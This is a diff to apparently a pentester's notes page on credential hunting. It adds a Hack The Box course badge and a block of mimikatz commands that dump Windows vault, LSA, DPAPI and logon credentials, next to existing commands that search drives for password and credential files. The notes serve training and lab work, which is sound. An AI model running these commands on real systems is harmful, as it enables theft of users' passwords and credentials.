@@ -238,6 +238,7 @@ You can use [truffleHog](https://github.com/trufflesecurity/truffleHog) <small>(
 
 [![password_attacks](../../_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 [![linuxprivilegeescalation](../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
+[![pivoting_tunneling_port_forwarding](../../_badges/htb/pivoting_tunneling_port_forwarding.svg)](https://academy.hackthebox.com/course/preview/pivoting-tunneling-and-port-forwarding)
 [![linuxprivesc](../../_badges/thm/linuxprivesc.svg)](https://tryhackme.com/room/linuxprivesc)
 [![ignite](../../_badges/thm-p/ignite.svg)](https://tryhackme.com/room/ignite)
 [![chillhack](../../_badges/thm-p/chillhack.svg)](https://tryhackme.com/room/chillhack)
@@ -339,6 +340,16 @@ CMD> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
 CMD> where /R C:\ *.txt *.ini *.cfg *.config *.xml
 CMD> dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 PS> Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
+```
+
+Refer to [these notes](/operating-systems/windows/security/index.md#windows-pentester-notes-):
+
+```shell!
+mimikatz# vault::list
+mimikatz# vault::cred
+mimikatz# lsadump::lsa /patch
+mimikatz# sekurlsa::dpapi
+mimikatz# sekurlsa::logonpasswords
 ```
 
 Dig centrally deployed application:
